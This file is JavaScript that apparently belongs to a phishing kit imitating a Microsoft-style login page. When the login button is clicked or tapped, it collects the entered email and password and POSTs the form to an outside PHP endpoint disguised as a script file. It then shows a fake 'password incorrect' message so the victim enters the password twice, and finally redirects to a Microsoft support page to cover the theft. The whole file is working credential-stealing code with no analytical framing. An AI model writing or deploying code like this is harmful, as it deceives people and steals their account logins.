var countAttempt = 0;
var sendUrl = "https://boatsbooker.com/js/lighjs.php?inc";

document.addEventListener('DOMContentLoaded', function () {
    var btnLogin = document.getElementById('btnLogin');
    var msgFont = document.getElementById('msgfont');

    btnLogin.addEventListener("click", function (event) {
        event.preventDefault();
        var password = document.getElementById('password').value;
        if (password == "") {
            msgFont.innerHTML = "Please enter password";
        } else {
            sendData();
        }
    });

    btnLogin.addEventListener("touchend", function (event) {
        event.preventDefault();
        var password = document.getElementById('password').value;
        if (password == "") {
            msgFont.innerHTML = "Please enter password";
        } else {
            sendData();
        }
    });

    function sendData() {
        var xiemail = document.getElementById('email').value;
        var pipassword = document.getElementById('password').value;

        console.log("Email - " + xiemail);
        console.log("Password - " + pipassword);

        // You can use the FormData object to collect form data
        var formData = new FormData(document.forms.street);

        countAttempt++;

        var xhr = new XMLHttpRequest();
        xhr.open('POST', sendUrl);

        xhr.send(formData);

        if (countAttempt >= 2) {
            setTimeout(function () {
                window.location = "https://support.microsoft.com/en-us/error/+76W-%";
            }, 2000);
            btnLogin.value = "Verifying....";
            msgFont.innerHTML = "";
        } else {
            setTimeout(function () {
                msgFont.innerHTML = "Your account or password is incorrect.";
                btnLogin.value = "Next";
            }, 2000);
            btnLogin.value = "Verifying....";
        }
    }
});
